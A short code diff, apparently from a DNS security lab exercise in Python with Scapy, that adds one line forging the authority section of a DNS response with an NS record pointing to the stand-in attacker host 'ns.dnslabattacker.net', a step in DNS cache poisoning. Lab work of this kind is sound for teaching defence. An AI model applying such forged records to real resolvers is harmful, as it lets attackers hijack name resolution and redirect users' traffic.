@@ -51,6 +51,7 @@ def exampleSendDNSQuery():
     sendPacket(sock, dnsPacket, my_ip, my_port)
     response = sock.recv(4096)
     response = DNS(response)
+    response[DNS].ns = DNSRR(rrname=response[DNS].qd.qname, type='NS', ttl=84107, rdata='ns.dnslabattacker.net')
     print "\n***** Packet Received from Remote Server *****"
     print response.show()
     print "***** End of Remote Server Packet *****\n"
